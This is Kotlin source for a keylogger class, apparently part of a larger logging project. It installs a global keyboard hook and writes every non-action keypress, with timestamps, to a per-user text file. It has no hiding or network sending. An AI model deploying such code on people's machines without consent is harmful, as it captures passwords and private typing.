package loggers.keyLogger

import loggers.Logger
import org.jnativehook.GlobalScreen
import org.jnativehook.NativeHookException
import org.jnativehook.keyboard.NativeKeyEvent
import org.jnativehook.keyboard.NativeKeyListener
import java.io.File
import java.io.RandomAccessFile
import java.util.LinkedList
import java.util.Queue
import kotlin.concurrent.thread
import kotlin.system.exitProcess

class KeyLogger(username: String) : Logger, NativeKeyListener {

    private var startTime = 0L

    private val mPathToFile = "${System.getProperty("user.dir")}/data/${username}_Keys.txt"

    @Volatile
    private var mFile = File(mPathToFile)

    @Volatile
    private var queueToWrite = LinkedList<String>()

    private fun setFile() {
        if (!mFile.exists()) mFile.createNewFile()
    }

    override fun start() {
        try {
            GlobalScreen.registerNativeHook()
        } catch (ex: NativeHookException) {
            System.err.println("There was a problem registering the native hook.")
            exitProcess(1)
        }

        setFile()

        startTime = System.currentTimeMillis()

        GlobalScreen.addNativeKeyListener(this)
    }

    private fun clearQueue() {
        queueToWrite.forEach {
            mFile.appendText(it)
        }
        queueToWrite.clear()
    }

    override fun stop() {
        GlobalScreen.removeNativeKeyListener(this)
        // Causes System.exit(1) on Arch and Mint :)

        clearQueue()

        GlobalScreen.unregisterNativeHook()
    }

    override fun nativeKeyPressed(e: NativeKeyEvent) {
        if (!e.isActionKey) {
            queueToWrite.add(
                "key=${NativeKeyEvent.getKeyText(e.keyCode)}," +
                        " timestamp=${System.currentTimeMillis()}\n"
            )
            if (queueToWrite.size == 100) {
                clearQueue()
            }
        }
    }

    override fun nativeKeyReleased(e: NativeKeyEvent) {
    }

    override fun nativeKeyTyped(e: NativeKeyEvent) {
    }
}